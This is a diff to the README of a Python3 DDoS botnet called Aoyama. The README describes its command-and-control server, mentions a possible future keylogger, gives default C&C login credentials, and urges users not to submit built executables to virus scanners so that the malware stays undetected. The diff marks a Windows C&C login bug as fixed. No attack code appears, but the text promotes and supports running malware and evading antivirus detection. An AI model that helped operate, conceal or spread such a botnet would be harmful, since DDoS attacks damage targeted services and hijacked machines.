@@ -3,11 +3,11 @@ Aoyama is a New version of Python3 botnet, old version: http://github.com/Leeon1
 
 Aoyama is for ddos(Maybe add more function later, such as...keylogger?)
 
-**And Now It's version 2.0**
-
 ***PLS Don't scan the executable file generated from pyinstaller or py2exe on any virus scanner(such as VirusTotal), if you want to keep using this project(i will continue update the code) and not be detected*** 
 
-**Plese run the cnc.py in linux, run in windows will have bug when login to cnc(idk why but i will try to fix it)**
+**~~Plese run the cnc.py in linux, run in windows will have bug when login to cnc(idk why but i will try to fix it)~~**
+
+**Fixed**
 
 **Test video(OLD): https://www.youtube.com/watch?v=W4YR-cf3xD0**
 
@@ -66,4 +66,3 @@ After that, Just input ur username and password.
             Username:Leeon123
             Password:test
             
-**Welcome to Aoyama C&C Server.**
